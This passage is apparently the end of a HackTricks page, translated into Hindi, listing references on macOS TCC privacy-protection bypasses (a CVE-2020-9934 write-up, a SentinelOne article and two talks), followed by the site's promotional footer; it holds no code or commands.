* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबरसिक्योरिटी कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी का विज्ञापन HackTricks में** देखना चाहते हैं? या क्या आप **PEASS के नवीनतम संस्करण तक पहुंच चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह।
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें।
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **hacktricks repo** में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें और [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
